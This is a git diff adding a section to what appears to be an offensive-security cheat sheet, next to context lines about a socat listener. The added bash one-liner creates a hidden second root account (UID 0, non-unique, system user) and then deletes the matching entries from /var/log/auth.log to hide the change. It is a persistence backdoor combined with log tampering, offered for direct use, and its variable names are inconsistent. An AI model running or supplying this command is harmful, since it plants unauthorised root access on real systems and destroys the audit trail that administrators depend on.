@@ -127,6 +127,10 @@ I find this best works with a socat listener due to the readline support.
 socat readline TCP-LISTEN:1234
 ```
 
+**One line root useradd**
+```bash
+USERNAME="name";PASSWD=`perl -e 'print crypt($PASSWD, "sa")'` && sudo useradd -p $PASSWORD --system --shell '/bin/bash' --base-dir "/bin" --uid 0 --non-unique --comment "Comment Here" $USERNAME && sudo sed -i '/useradd/d;/$USERNAME/d;' /var/log/auth.log
+```
 
 Credits
 -----------
